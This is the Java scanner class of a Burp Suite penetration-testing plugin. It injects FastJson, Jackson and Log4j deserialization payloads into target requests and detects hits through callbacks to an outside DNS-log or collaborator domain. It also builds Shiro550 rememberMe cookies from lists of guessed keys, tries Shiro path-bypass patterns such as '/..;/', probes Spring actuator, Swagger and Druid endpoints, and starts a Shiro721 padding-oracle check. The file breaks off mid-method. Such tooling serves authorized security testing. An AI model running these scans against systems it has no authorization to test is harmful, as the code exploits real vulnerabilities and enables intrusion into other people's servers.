/*
 * JaySenScan - Burp Suite 加密环境渗透测试插件
 *
 * Copyright (C) 2025 JaySen (Jaysen13)
 *
 * 本软件采用 CC BY-NC-SA 4.0 许可证进行许可
 * 禁止用于商业售卖，允许非商业使用、修改和分享，衍生品需采用相同许可证
 *
 * 作者：JaySen
 * 邮箱：3147330392@qq.com
 * GitHub：https://github.com/Jaysen13/JaySenScan
 * 许可证详情：参见项目根目录 LICENSE 文件
 */
import burp.api.montoya.MontoyaApi;
import burp.api.montoya.http.handler.HttpRequestToBeSent;
import burp.api.montoya.http.message.HttpHeader;
import burp.api.montoya.http.message.HttpRequestResponse;
import burp.api.montoya.http.message.params.HttpParameter;
import burp.api.montoya.http.message.params.HttpParameterType;
import burp.api.montoya.http.message.requests.HttpRequest;
import burp.api.montoya.http.message.responses.HttpResponse;
import com.alibaba.fastjson2.JSONArray;
import com.alibaba.fastjson2.JSONObject;

import javax.crypto.BadPaddingException;
import javax.crypto.IllegalBlockSizeException;
import javax.crypto.NoSuchPaddingException;
import java.io.IOException;
import java.net.MalformedURLException;
import java.net.URL;
import java.net.URLEncoder;
import java.nio.charset.StandardCharsets;
import java.security.InvalidAlgorithmParameterException;
import java.security.InvalidKeyException;
import java.security.NoSuchAlgorithmException;
import java.util.*;
import java.util.Base64;
import java.util.concurrent.ConcurrentHashMap;

public class Scan {
    private final MontoyaApi montoyaApi;
    private MySuiteTab mySuiteTab;
    private PluginTaskExecutor executor;
    Boolean logEnable;
    private SaveLogFile saveLogFile;
    Boolean cryptEnable;
    // 记录已扫的shiro550和721，避免重复扫描
    private final Set<String> scannedShiro550Hosts = new HashSet<>();
    private final Set<String> scannedShiro721Hosts = new HashSet<>();
    public Scan(MontoyaApi montoyaApi,MySuiteTab mySuiteTab,PluginTaskExecutor executor) {
        this.montoyaApi = montoyaApi;
        this.mySuiteTab = mySuiteTab;
        this.executor = executor;
        this.logEnable = DnslogConfig.getInstance().logEnabled;
        this.saveLogFile = new SaveLogFile(montoyaApi);
        this.cryptEnable = DnslogConfig.getInstance().cryptoEnabled;
    }

    /**
     * 对HTTP请求的所有JSON数据进行替换并发送
     * @param request 原始HTTP请求
     * @param rawDatas 需要替换的json数据列表
     */
    public void fastJsonScan(HttpRequestToBeSent request, List<JsonData> rawDatas) {
        String topDomain1 = "fjson";
        String topDomain2 = UUID.randomUUID().toString().replace("-", "").substring(0, 8);
        try {
            this.montoyaApi.logging().logToOutput("[INFO] 正在FastJson扫描 TargetURL: " + request.url());
            String timestamp = String.valueOf(System.currentTimeMillis());
            Config config = new Config(timestamp,topDomain1+topDomain2,DnslogConfig.getInstance().collaboratorDomain);
            // 解析Config类中的fastjsonPayload为JSONArray
            JSONArray payloads = JSONArray.parseArray(config.fastjsonPayload);
            // 遍历所有待替换的JSON数据（来自GET参数、POST参数、请求体）
            for (JsonData rawData : rawDatas){
                // 循环遍历Payload集合，逐个发送
                for (int i = 0; i < payloads.size(); i++) {

                    Object payloadObj = payloads.get(i);
                    String payloadStr;

                    // 判断 Payload 类型：JSONObject 或 JSONArray
                    if (payloadObj instanceof JSONObject) {
                        payloadStr = ((JSONObject) payloadObj).toJSONString();
                    } else if (payloadObj instanceof JSONArray) {
                        payloadStr = ((JSONArray) payloadObj).toJSONString(); // 数组类型直接序列化
                    } else {
                        this.montoyaApi.logging().logToOutput("[INFO] Payload[" + (i + 1) + "] 不是 JSON 对象/数组，跳过");
                        continue;
                    }
                    // 将内部的旧topDomain2替换为新topDomain2
                    String newtopDomain2 = UUID.randomUUID().toString().replace("-", "").substring(0, 8);
                    HttpRequest modifiedRequest = replaceJsonInRequest(request, rawData, payloadStr.replace(topDomain2, newtopDomain2));
                    modifiedRequest = modifiedRequest.withAddedHeader("JaySen-FastJson-Scan","true");
                    // 发送修改后的请求
                    HttpRequestResponse attackReqResp = this.montoyaApi.http().sendRequest(modifiedRequest);
                    if (logEnable) {
                        // 加入已发送请求的存储日志中
                        saveLogFile.addToBatch(attackReqResp);
                    }
                    CheckDnslogResult.getInstance().addToBatch(newtopDomain2, attackReqResp);

                }
            }
        }
        catch (Exception e) {
            this.montoyaApi.logging().logToOutput("[ERROR] FastJSON扫描过程出错：" + e.getMessage());
            this.montoyaApi.logging().logToError("[ERROR] FastJSON扫描过程出错：" + e.getMessage());
        }
    }

    // 参数类型改为List接口，提高灵活性
    public void fastJsonScan(List<HttpRequest> requests, List<List<JsonData>> rawDatass) {
        String topDomain1 = "fjson";
        String topDomain2 = UUID.randomUUID().toString().replace("-", "").substring(0, 8);
        try {
            this.montoyaApi.logging().logToOutput("[INFO] 正在批量FastJson扫描，共" + requests.size() + "个请求");
            // 边界检查：确保请求列表和JSON数据列表的长度一致
            if (requests.size() != rawDatass.size()) {
                this.montoyaApi.logging().logToError("[ERROR] 请求数量与JSON数据列表数量不匹配，终止扫描");
                return;
            }

            String timestamp = String.valueOf(System.currentTimeMillis());
            // 初始化配置
            Config config = new Config(timestamp,topDomain1+topDomain2,DnslogConfig.getInstance().collaboratorDomain);
            JSONArray payloads = JSONArray.parseArray(config.fastjsonPayload);

            // 遍历每个请求，通过索引关联对应的JSON数据列表（一一对应）
            for (int i = 0; i < requests.size(); i++) {
                HttpRequest originalRequest = requests.get(i);
                List<JsonData> rawDatas = rawDatass.get(i);  // 当前请求对应的JSON数据列表

                // 若当前请求无JSON数据，跳过
                if (rawDatas == null || rawDatas.isEmpty()) {
                    this.montoyaApi.logging().logToOutput("[INFO] 请求[" + i + "]无JSON数据，跳过扫描");
                    continue;
                }

                // 遍历当前请求的所有JSON数据
                for (JsonData rawData : rawDatas) {
                    // 遍历所有payload，替换并发送
                    for (int p = 0; p < payloads.size(); p++) {
                        JSONObject payload = payloads.getJSONObject(p);
                        String payloadStr = payload.toJSONString();

                        // 将内部的旧topDomain2替换为新topDomain2
                        String newtopDomain2 = UUID.randomUUID().toString().replace("-", "").substring(0, 8);
                        HttpRequest modifiedRequest = replaceJsonInRequest(originalRequest, rawData, payloadStr.replace(topDomain2, newtopDomain2));
                        modifiedRequest = modifiedRequest.withAddedHeader("JaySen-FastJson-Scan", "true");

                        // 发送请求
                        HttpRequestResponse attackReqResp = this.montoyaApi.http().sendRequest(modifiedRequest);
                        if (logEnable) {
                            saveLogFile.addToBatch(attackReqResp);
                        }
                        CheckDnslogResult.getInstance().addToBatch(newtopDomain2,attackReqResp);
                    }
                }
            }

//            montoyaApi.logging().logToOutput("所有请求的FastJSON扫描已完成");
        } catch (Exception e) {
            this.montoyaApi.logging().logToOutput("[ERROR] FastJSON扫描出错：" + e.getMessage());
            this.montoyaApi.logging().logToError("[ERROR] FastJSON扫描出错：" + e.getMessage());
        }
    }




    /**
     * 根据JSON数据的位置，替换请求中的对应部分为payload
     */
    private HttpRequest replaceJsonInRequest(HttpRequest rawRequest, JsonData rawData, String payloadStr) {
        String encodedPayload = payloadStr;
        if (!cryptEnable){
            // 对payload进行URL编码（适用于GET/POST参数，请求体JSON无需编码）
            encodedPayload = URLEncoder.encode(payloadStr, StandardCharsets.UTF_8)
                    .replace("+", "%20"); // 确保空格编码为%20（符合URL规范）
        }
        switch (rawData.getSourceType()) {
            case REQUEST_BODY:
                // 替换请求体（保留其他请求头、参数等，仅修改body）
                return rawRequest.withBody(payloadStr);

            case GET_PARAM:
                // 修正：GET查询参数的正确类型是 QUERY
                HttpParameter getParam = HttpParameter.parameter(
                        rawData.getParamName(),  // 参数名
                        encodedPayload,         // 编码后的payload
                        HttpParameterType.URL  // 正确类型：QUERY（对应URL中的?后的参数）
                );
                // 仅更新当前参数，其他GET参数保持不变
                return rawRequest.withUpdatedParameters(getParam);

            case POST_PARAM:
                // POST表单参数类型为 BODY（正确）
                HttpParameter postParam = HttpParameter.parameter(
                        rawData.getParamName(),  // 参数名
                        encodedPayload,         // 编码后的payload
                        HttpParameterType.BODY   // 正确类型：BODY（对应application/x-www-form-urlencoded的表单参数）
                );
                // 仅更新当前参数，其他POST参数保持不变
                return rawRequest.withUpdatedParameters(postParam);

            default:
                return rawRequest;
        }
    }


    /***
     Jackson反序列化漏洞检测（复用FastJson扫描流程）
     ***/
    public void jacksonScan(HttpRequestToBeSent request, List<JsonData> rawDatas) {
        String topDomain1 = "jackson";
        String topDomain2 = UUID.randomUUID().toString().replace("-", "").substring(0, 8);
        try {
            this.montoyaApi.logging().logToOutput("[INFO] 正在Jackson扫描 TargetURL: " + request.url());
            String timestamp = String.valueOf(System.currentTimeMillis());
            Config config = new Config(timestamp, topDomain1 + topDomain2, DnslogConfig.getInstance().collaboratorDomain);
            JSONArray payloads = JSONArray.parseArray(config.jacksonPayload);
            for (JsonData rawData : rawDatas) {
                for (int i = 0; i < payloads.size(); i++) {
                    Object payloadObj = payloads.get(i);
                    String payloadStr;
                    if (payloadObj instanceof JSONObject) {
                        payloadStr = ((JSONObject) payloadObj).toJSONString();
                    } else if (payloadObj instanceof JSONArray) {
                        payloadStr = ((JSONArray) payloadObj).toJSONString();
                    } else {
                        continue;
                    }
                    // 将内部的旧topDomain2替换为新topDomain2
                    String newtopDomain2 = UUID.randomUUID().toString().replace("-", "").substring(0, 8);
//                    montoyaApi.logging().logToOutput("oldtopdomain2:" + topDomain2 + " newtopdomain2:" + newtopDomain2);
//                    montoyaApi.logging().logToOutput("jackson漏扫发送的第" + (i+1) + "个payload：");
//                    montoyaApi.logging().logToOutput(payloadStr);
                    HttpRequest modifiedRequest = replaceJsonInRequest(request, rawData, payloadStr.replace(topDomain2, newtopDomain2));
                    modifiedRequest = modifiedRequest.withAddedHeader("JaySen-Jackson-Scan", "true");
                    HttpRequestResponse attackReqResp = this.montoyaApi.http().sendRequest(modifiedRequest);

//                    montoyaApi.logging().logToOutput("数据包：");
//                    montoyaApi.logging().logToOutput(modifiedRequest.bodyToString());
                    if (logEnable) {
                        saveLogFile.addToBatch(attackReqResp);
                    }
                    CheckDnslogResult.getInstance().addToBatch(newtopDomain2, attackReqResp);
                }
            }
        } catch (Exception e) {
            this.montoyaApi.logging().logToOutput("[ERROR] Jackson扫描过程出错：" + e.getMessage());
            this.montoyaApi.logging().logToError("[ERROR] Jackson扫描过程出错：" + e.getMessage());
        }
    }

    /**
     * Log4j 全版本漏洞探测
     * */
    public void log4jScan(HttpRequestToBeSent request) {
//        montoyaApi.logging().logToOutput("开始log4j扫描  目标数据包如下:\n"+request);
        String topDomain1 = "log4j";
        String topDomain2 = UUID.randomUUID().toString().replace("-", "").substring(0, 8);
        try {
            this.montoyaApi.logging().logToOutput("[INFO] 正在Log4j扫描 TargetURL: " + request.url());
            String timestamp = String.valueOf(System.currentTimeMillis());
            // 初始化配置
            Config config = new Config(timestamp,topDomain1+topDomain2,DnslogConfig.getInstance().collaboratorDomain);

            if (config.log4jPayload == null || config.log4jPayload.isEmpty()) {
                this.montoyaApi.logging().logToError("[ERROR] Log4j探测失败：Config未配置log4jPayload");
                return;
            }

            // 关键：log4jPayload是字符串数组，直接解析为JSONArray（无需JSONObject）
            JSONArray payloads = JSONArray.parseArray(config.log4jPayload);

            // 遍历Payload：直接用getString(i)获取字符串，无需getJSONObject
            for (int i = 0; i < payloads.size(); i++) {
                // 修复：getString(i) 提取字符串类型的Payload
                String payloadStr = payloads.getString(i);
                if (payloadStr == null || payloadStr.trim().isEmpty()) {
                    this.montoyaApi.logging().logToOutput("[INFO] 跳过空Payload[" + (i + 1) + "]");
                    continue;
                }
                // 将内部的旧topDomain2替换为新topDomain2
                String newtopDomain2 = UUID.randomUUID().toString().replace("-", "").substring(0, 8);
                String newPayloadStr = payloadStr.replace(topDomain2, newtopDomain2);
                // 参数值URL编码（请求头无需编码）
                String encodedPayload = newPayloadStr;
                if (!cryptEnable) {
                    encodedPayload = URLEncoder.encode(newPayloadStr, StandardCharsets.UTF_8)
                            .replace("+", "%20");
                }
                // 替换所有请求头和参数（原有逻辑不变）
                HttpRequest modifiedRequest = replaceAllHeaders(request, newPayloadStr);
                modifiedRequest = replaceAllParameters(modifiedRequest, encodedPayload);
                modifiedRequest = modifiedRequest.withAddedHeader("JaySen-Log4j-Scan", "true")
                        .withAddedHeader("JaySen-Log4j-Payload-Index", String.valueOf(i + 1));
//                montoyaApi.logging().logToOutput("log4jScan:\n"+modifiedRequest);
                // 发送请求
                HttpRequestResponse attackReqResp = this.montoyaApi.http().sendRequest(modifiedRequest);
//                montoyaApi.logging().logToOutput(modifiedRequest+"\n");
//                montoyaApi.logging().logToOutput(attackReqResp.request()+"\n");
//                montoyaApi.logging().logToOutput(attackReqResp.response()+"\n");
                if (logEnable) {
                    saveLogFile.addToBatch(attackReqResp);
                }
                CheckDnslogResult.getInstance().addToBatch(newtopDomain2,attackReqResp);

            }

//            montoyaApi.logging().logToOutput("Log4j全方位探测所有Payload已发送完成");
        } catch (Exception e) {
            this.montoyaApi.logging().logToOutput("[ERROR] Log4j全方位扫描出错：" + e.getMessage());
            this.montoyaApi.logging().logToError("[ERROR] Log4j全方位扫描出错：" + e.getMessage());
        }
    }

    /**
     * 替换所有非关键请求头的值为Payload（保留必要头，防止请求失效）
     */
    private HttpRequest replaceAllHeaders(HttpRequestToBeSent request, String payloadStr) {
        HttpRequest modifiedRequest = request;
        // 定义需要保留的关键头（避免替换后请求无法正常发送）
        List<String> reservedHeaders = new ArrayList<>();
        reservedHeaders.add("Host");          // 必须保留，否则目标地址失效
        reservedHeaders.add("Content-Length");// 必须保留，否则请求体长度不匹配
        reservedHeaders.add("JaysenReqReceived");
        reservedHeaders.add("JaysenReqToBeSent");
        reservedHeaders.add("Content-Type");  // 保留，确保POST表单格式正确
        reservedHeaders.add("Connection");    // 保留，维持连接状态
        reservedHeaders.add("Accept");
        reservedHeaders.add("Accept-Encoding");
        reservedHeaders.add("Accept-Language");
        reservedHeaders.add("Transfer-Encoding");
        reservedHeaders.add("Content-Encoding");
        reservedHeaders.add("Content-Language");
        // 遍历所有请求头，替换非关键头的值
        for (HttpHeader header : request.headers()) {
            String headerName = header.name();
            // 跳过关键头，替换其他头的值
            if (!reservedHeaders.contains(headerName)) {
                modifiedRequest = modifiedRequest.withUpdatedHeader(headerName, payloadStr);
            }
        }
        return modifiedRequest;
    }

    /**
     * 替换所有参数的值为编码后的Payload（GET/POST表单参数）
     */
    private HttpRequest replaceAllParameters(HttpRequest request, String encodedPayload) {
        HttpRequest modifiedRequest = request;
        // 遍历所有参数（包括GET的QUERY参数、POST的BODY参数）
        for (HttpParameter param : request.parameters()) {
            HttpParameterType paramType = param.type();
            // 按参数类型创建新参数（同名，值为编码后的Payload）
            HttpParameter newParam = switch (paramType) {
                case URL -> HttpParameter.parameter(param.name(), encodedPayload, HttpParameterType.URL);
                case BODY -> HttpParameter.parameter(param.name(), encodedPayload, HttpParameterType.BODY);
                case JSON -> HttpParameter.parameter(param.name(), encodedPayload, HttpParameterType.JSON);
                default -> param; // 其他参数类型（如COOKIE）暂不替换，可根据需求扩展
            };
            // 更新参数值（API自动覆盖原有参数）
            modifiedRequest = modifiedRequest.withUpdatedParameters(newParam);
        }
        return modifiedRequest;
    }

    /**
     * spring未授权访问扫描
     */
    public void springScan(HttpRequestToBeSent request) {
        String originalUrl = request.url();
        String originalPath = request.withRemovedParameters(request.parameters()).path();
        this.montoyaApi.logging().logToOutput("[INFO] 正在Spring扫描 TargetURL: " + originalUrl);
        //  先判断是否为潜在API URL，不是则直接返回
         if (!UrlFilter.isPotentialApiUrl(originalUrl)) {
 //            montoyaApi.logging().logToOutput("跳过非API URL的spring扫描: " + originalUrl);
             return;
         }

        //  常见的Spring扫描Payload（可在DnslogConfig中配置）
        List<String> springPayloads = DnslogConfig.getInstance().getSpringPaths();

        //  拆分原始路径为片段，从子路径到根目录逐层扫描
        String[] pathSegments = originalPath.split("/");
        StringBuilder currentPath = new StringBuilder();

        for (int i = 0; i < pathSegments.length; i++) {
            if (i > 0) {
                currentPath.append("/");
            }
            currentPath.append(pathSegments[i]);

            // 对当前层级的路径，拼接所有Payload进行扫描
            for (String payload : springPayloads) {
                String scanPath = currentPath + payload;
                try {
                    // 添加扫描标记头，避免重复扫描
                    HttpRequest scannedRequest = request
                            .withAddedHeader("JaySen-Spring-Scan", "true")
                            .withPath(scanPath);

                    HttpRequestResponse attackReqResp = montoyaApi.http().sendRequest(scannedRequest);
//                    montoyaApi.logging().logToOutput("Spring扫描中: " + attackReqResp.request().url());

                    if (attackReqResp.response() == null) {
                        continue;
                    }

                    // 命中条件：状态码200且响应体包含特征
                    int respCode = attackReqResp.response().statusCode();
                    if (isRealSpringUnauth(attackReqResp.response(),payload)) {
                        executor.submit(() -> mySuiteTab.addRequestInfo(attackReqResp, "Spring未授权访问"));
                        montoyaApi.logging().logToOutput("[INFO] 发现Spring未授权访问: " + attackReqResp.request().url());

                    }
                } catch (Exception e) {
                    this.montoyaApi.logging().logToOutput("[ERROR] Spring扫描出错（路径：" + scanPath + "）: " + e.getMessage());
                    montoyaApi.logging().logToError("[ERROR] Spring扫描出错（路径：" + scanPath + "）: " + e.getMessage());
                }
            }
        }
    }

    /**
     * 判断响应是否真正命中Spring未授权访问，避免仅靠状态码误报
     * @param response 原始响应对象
     * @param payload 当前扫描的Payload（如 /actuator）
     * @return true表示确认为未授权访问
     */
    private boolean isRealSpringUnauth(HttpResponse response, String payload) {
        int statusCode = response.statusCode();
        // 仅处理200/301/302
        if (statusCode != 200 && statusCode != 302 && statusCode != 301) {
            return false;
        }

        String contentType = response.headerValue("Content-Type");
        String location = response.headerValue("Location");
        String body = null;
        if (response.body() != null) {
            try {
                body = response.bodyToString();
                if (body.length() > 8192) {
                    body = body.substring(0, 8192); // 截取前8KB分析
                }
            } catch (Exception ignored) {}
        }

        // ---- 通用黑名单过滤 ----
        if (body != null) {
            String lb = body.toLowerCase();
            if (lb.contains("whitelabel error page") ||
                    lb.contains("unauthorized") ||
                    lb.contains("token expired") ||
                    lb.contains("access denied") ||
                    lb.contains("请登录") ||
                    lb.contains("action=\"login\"") ||
                    lb.contains("<input type=\"password\"")) {
                return false;
            }
        }

        // ---- 302/301 跳转过滤 ----
        if ((statusCode == 302 || statusCode == 301) && location != null) {
            String ll = location.toLowerCase();
            if (ll.contains("login") || ll.contains("auth") || ll.contains("signin") || !location.startsWith("/")) {
                return false; // 跳转到登录页或外域，视为需认证
            }
            // 如果 Payload 是 Druid 且跳转也含 login，已在上面捕获；其他管理端跳转可放行
        }

        // ---- 按 Payload 特征匹配 ----
        String p = payload.toLowerCase();

        // Actuator 系列
        if (p.startsWith("/actuator")) {
            if (statusCode == 200 && contentType != null && contentType.contains("json") && body != null) {
                if (body.contains("\"_links\"") || body.contains("\"status\":")) {
                    return true; // /actuator 或 /health 等
                }
                if (p.contains("env") && body.contains("propertySources")) return true;
                if (p.contains("mappings") && body.contains("dispatcherServlets")) return true;
                if (p.contains("configprops") && body.contains("beans")) return true;
            }
            return false;
        }

        // Swagger / API docs / Knife4j / Spring-UI
        if (p.contains("swagger") || p.contains("api-docs") || p.contains("doc.html") ||
                p.contains("knife4j") || p.contains("spring-ui") || p.contains("spring-resources") ||
                p.contains("spring.json") || p.endsWith("/spring")) {

            if (statusCode == 200 && body != null) {
                // UI 页面
                if ((body.contains("Swagger UI") || body.contains("swagger-ui")) &&
                        (body.contains("swagger-ui.css") || body.contains("swagger-ui-standalone-preset"))) return true;
                // JSON 文档
                if (contentType != null && contentType.contains("json") &&
                        (body.contains("\"swagger\":\"2.0\"") || body.contains("\"openapi\":\"") ||
                                (body.contains("\"info\"") && body.contains("\"paths\"")) ||
                                (body.contains("\"url\"") && body.contains("\"name\"")))) return true;
                // Knife4j
                if (body.contains("Knife4j") || body.contains("knife4j")) return true;
                // spring-ui
                if (body.contains("spring-ui") || body.contains("Spring UI")) return true;
            }
            // 允许跳转到同系列资源
            if ((statusCode == 302 || statusCode == 301) && location != null &&
                    (location.contains("swagger") || location.contains("api-docs") || location.contains("doc.html"))) {
                return true;
            }
            return false;
        }

        // Druid 监控
        if (p.contains("druid")) {
            if (statusCode == 200 && body != null && body.contains("Druid Stat") && !body.contains("login")) return true;
            if ((statusCode == 302 || statusCode == 301) && location != null && location.contains("druid") && !location.contains("login")) return true;
            return false;
        }

        // webjars（低危，可按需记录）
        if (p.contains("webjars")) {
            if (statusCode == 200 && body != null && (body.contains("webjars") || body.contains("<title>Directory listing"))) return true;
            return false;
        }

        // 未配置 Payload 的兜底：严格匹配 JSON + 常见关键字
        if (statusCode == 200 && contentType != null && contentType.contains("json") && body != null &&
                (body.contains("\"_links\"") || body.contains("\"swagger\"") || body.contains("\"openapi\""))) {
            return true;
        }

        return false;
    }

    /***
     扫描shiro漏洞
     ***/
    public void shiroScan(HttpRequestToBeSent request) throws InvalidAlgorithmParameterException, NoSuchPaddingException, IllegalBlockSizeException, IOException, NoSuchAlgorithmException, BadPaddingException, NoSuchFieldException, InvalidKeyException, IllegalAccessException {
        HttpRequest newrequest = request.withAddedHeader("JaySen-Shiro-Scan","true");
        String shiro550_flag = request.headerValue("JaySen-Shiro550-Scan");
        String shiroBypass_flag = request.headerValue("JaySen-Shiro-Bypass-Scan");
        String shiro721_flag = request.headerValue("JaySen-Shiro721-Scan");
        // 若请求头无此字段 则赋值false
        if (shiro550_flag == null) shiro550_flag = "false";
        if (shiroBypass_flag == null) shiroBypass_flag = "false";
        if (shiro721_flag == null) shiro721_flag = "false"; 
        // shiro 550 721 权限绕过扫描
        if (shiro550_flag.equals("false")) shiro550Scan(newrequest);
        if (shiroBypass_flag.equals("false")) shiroBypassScan(newrequest);
        if (shiro721_flag.equals("false")) shiro721Scan(newrequest);
    }

    /***
     判断是否存在shiro框架
     ***/
    public Boolean isShiro(HttpRequestToBeSent request) {
        // 避免无限递归
        if (request.header("JaySen-isShiro") != null) {
            return false;
        }

        try {
            HttpRequest checkRequest = request
                    .withRemovedHeader("Cookie")
                    .withHeader("Cookie", "rememberMe=123")
                    .withAddedHeader("JaySen-isShiro", "true");

            var response = montoyaApi.http().sendRequest(checkRequest);
            // 通过发送不正确的rememverMe参数在cookie，通过返回的Set-Cookie响应头判断
            String setCookie = response.response().headerValue("Set-Cookie");
            if (setCookie != null && setCookie.contains("rememberMe=deleteMe")) {
                montoyaApi.logging().logToOutput("目标 " + request.url() + " 是shiro框架");
                return true;
            }
        } catch (Throwable e) {
            this.montoyaApi.logging().logToOutput("[ERROR] Shiro 框架判断异常: " + e.getMessage());
            montoyaApi.logging().logToError("[ERROR] Shiro 框架判断异常: " + e.getMessage());
        }

        return false;
    }

    /***
     shiro550漏洞扫描
     ***/
    private void shiro550Scan(HttpRequest request) throws InvalidAlgorithmParameterException, NoSuchPaddingException, IllegalBlockSizeException, IOException, NoSuchAlgorithmException, BadPaddingException, NoSuchFieldException, InvalidKeyException, IllegalAccessException {
//        montoyaApi.logging().logToOutput("shiro550scan:"+request.url());
        // 提取目标ip 端口 若已被扫描即略过
        String target = extractHostPort(request.url());
        if (!scannedShiro550Hosts.add(target)) {
//            montoyaApi.logging().logToOutput("目标已shiro550扫描过:"+target);
            return;
        }
        this.montoyaApi.logging().logToOutput("[INFO] 正在Shiro550扫描 TargetURL: " + request.url());
        String topDomain1 = "shiro550";
        String urldns;
        // 初始化配置
        String timestamp = String.valueOf(System.currentTimeMillis());
        // 加载shirokeys
        List<String> shiroKeys = DnslogConfig.getInstance().getShiroKeys();
        if (shiroKeys == null) {
            this.montoyaApi.logging().logToError("[ERROR] Shiro550 探测失败：Config未配置shirokeys");
            return;
        }

        for (String shiroKey : shiroKeys) {
            String topDomain2 = UUID.randomUUID().toString().replace("-", "").substring(0, 8);
            // 初始化配置
            Config config = new Config(timestamp,topDomain1+topDomain2,DnslogConfig.getInstance().collaboratorDomain);
            // 确认dns类型
            if (DnslogConfig.getInstance().donlogType == Config.DnslogType.COLLABORATOR) {
                urldns = "https://" + topDomain1 + topDomain2 + "." + DnslogConfig.getInstance().collaboratorDomain;
            } else {
                urldns = "https://" + topDomain1 + topDomain2 + "." + DnslogConfig.getInstance().ceyeApiDomain;
            }
//            montoyaApi.logging().logToOutput(urldns);
            String payload = config.generateShiro550Payload(urldns,shiroKey);
            HttpRequest modifiedRequest = request.withRemovedHeader("Cookie").withHeader("Cookie","rememberMe="+payload).withAddedHeader("JaySen-shiroKey",shiroKey);
            // 添加标记头
            modifiedRequest = modifiedRequest.withAddedHeader("JaySen-Shiro550-Scan","true");
            // 发送修改后的请求
            HttpRequestResponse attackReqResp = this.montoyaApi.http().sendRequest(modifiedRequest);
//            montoyaApi.logging().logToOutput(attackReqResp);
            if (logEnable) {
                // 加入已发送请求的存储日志中
                saveLogFile.addToBatch(attackReqResp);
            }
            // 不立即检查DNSLOG，而是添加到批量缓存
            CheckDnslogResult.getInstance().addToBatch(topDomain2,attackReqResp);
        }
        montoyaApi.logging().logToOutput("[INFO] shiro550扫描完毕");
    }
    /**
     * 从字符串中提取 HOST:PORT
     * 例如：http://127.0.0.1:8088/login → 127.0.0.1:8088
     */
    public static String extractHostPort(String urlStr) {
        if (urlStr == null || urlStr.isBlank()) {
            return null;
        }

        try {
            URL url = new URL(urlStr);
            String host = url.getHost();
            int port = url.getPort();

            // 没有端口时只返回 host，有端口返回 host:port
            if (port == -1) {
                return host;
            } else {
                return host + ":" + port;
            }
        } catch (Exception e) {
            // 格式不合法时返回 null
            return null;
        }
    }
    /***
     shiro权限绕过扫描
     通过构造特殊URL路径（如 /..;/ /;/ 等）绕过Shiro权限校验
     ***/
    private void shiroBypassScan(HttpRequest request) {
        this.montoyaApi.logging().logToOutput("[INFO] 正在Shiro权限绕过扫描 TargetURL: " + request.url());
        String originalPath = request.path();

        List<String> bypassPatterns = Arrays.asList(
            "/..;/",
            "/;/",
            "/%20/",
            "/./",
            "//"
        );

        HttpRequestResponse baselineResp = null;
        try {
            HttpRequest baselineRequest = request.withAddedHeader("JaySen-Shiro-Bypass-Scan", "true");
            baselineResp = this.montoyaApi.http().sendRequest(baselineRequest);
            if (logEnable) {
                saveLogFile.addToBatch(baselineResp);
            }
        } catch (Exception e) {
            this.montoyaApi.logging().logToOutput("[ERROR] Shiro绕过扫描-请求发送失败：" + e.getMessage());
            this.montoyaApi.logging().logToError("[ERROR] Shiro绕过扫描-请求发送失败：" + e.getMessage());
            return;
        }

        int baselineStatus = baselineResp.response().statusCode();
        String baselineBody = null;
        try {
            if (baselineResp.response().body() != null) {
                baselineBody = baselineResp.response().bodyToString();
                if (baselineBody.length() > 8192) {
                    baselineBody = baselineBody.substring(0, 8192);
                }
            }
        } catch (Exception ignored) {}

        for (String pattern : bypassPatterns) {
            try {
                String decodedPattern = java.net.URLDecoder.decode(pattern, "UTF-8");
                String bypassPath;
                if (originalPath.startsWith("/")) {
                    bypassPath = "/" + decodedPattern.replaceAll("^/", "") + originalPath.substring(1);
                } else {
                    bypassPath = "/" + decodedPattern.replaceAll("^/", "");
                }

                HttpRequest bypassRequest = request
                    .withAddedHeader("JaySen-Shiro-Bypass-Scan", "true")
                    .withPath(bypassPath);

                HttpRequestResponse attackReqResp = this.montoyaApi.http().sendRequest(bypassRequest);

                if (logEnable) {
                    saveLogFile.addToBatch(attackReqResp);
                }

                int statusCode = attackReqResp.response().statusCode();
                String bypassBody = null;
                try {
                    if (attackReqResp.response().body() != null) {
                        bypassBody = attackReqResp.response().bodyToString();
                        if (bypassBody.length() > 8192) {
                            bypassBody = bypassBody.substring(0, 8192);
                        }
                    }
                } catch (Exception ignored) {}

                if (isShiroBypass(baselineStatus, baselineBody, statusCode, bypassBody)) {
                    executor.submit(() -> mySuiteTab.addRequestInfo(attackReqResp, "Shiro权限绕过"));
                    montoyaApi.logging().logToOutput("[INFO] 发现Shiro权限绕过: " + attackReqResp.request().url());
                    return;
                }

            } catch (Exception e) {
                this.montoyaApi.logging().logToOutput("[ERROR] Shiro绕过扫描出错（模式：" + pattern + "）：" + e.getMessage());
                this.montoyaApi.logging().logToError("[ERROR] Shiro绕过扫描出错（模式：" + pattern + "）：" + e.getMessage());
            }
        }

        montoyaApi.logging().logToOutput("[INFO] shiro权限绕过扫描完毕");
    }

    private boolean isShiroBypass(int baselineStatus, String baselineBody, int bypassStatus, String bypassBody) {
        if (bypassStatus != 200) {
            return false;
        }

        if (baselineStatus == 200) {
            if (baselineBody != null && bypassBody != null && !baselineBody.equals(bypassBody)) {
                return true;
            }
            return false;
        }

        if (baselineStatus == 302 || baselineStatus == 301 || baselineStatus == 403 || baselineStatus == 401) {
            if (bypassBody != null) {
                String lb = bypassBody.toLowerCase();
                if (lb.contains("login") || lb.contains("auth") || lb.contains("请登录") ||
                    lb.contains("unauthorized") || lb.contains("access denied")) {
                    return false;
                }
            }
            return true;
        }

        return false;
    }

    /***
     shiro721 Padding Oracle漏洞检测
     篡改rememberMe密文末尾字节，通过deleteMe响应判断是否存在Padding Oracle
     ***/
    private void shiro721Scan(HttpRequest request) {
        this.montoyaApi.logging().logToOutput("[INFO] 正在Shiro721扫描 TargetURL: " + request.url());
        String cookieHeader = request.headerValue("Cookie");
        String rememberMe = null;
        if (cookieHeader != null && !cookieHeader.isEmpty()) {
            java.util.regex.Matcher m = java.util.regex.Pattern
                .compile("rememberMe=([^;]+)")
                .matcher(cookieHeader);
            if (m.find()) {
                rememberMe = m.group(1);
            }
        }
        if (rememberMe == null || rememberMe.isEmpty()) {
            montoyaApi.logging().logToOutput("[INFO] 无rememberMe cookie，跳过Shiro721检测");
            return;
        }

        byte[] ciphertext;
        try {
            ciphertext = Base64.getDecoder().decode(rememberMe);
        } catch (IllegalArgumentException e) {
            this.montoyaApi.logging().logToOutput("[INFO] Shiro721: rememberMe Base64解码失败，跳过");
            return;
        }
        if (ciphertext.length < 32) return;

        String hostPort = extractHostPort(request.url());
        if (!scannedShiro721Hosts.add(hostPort)) return;

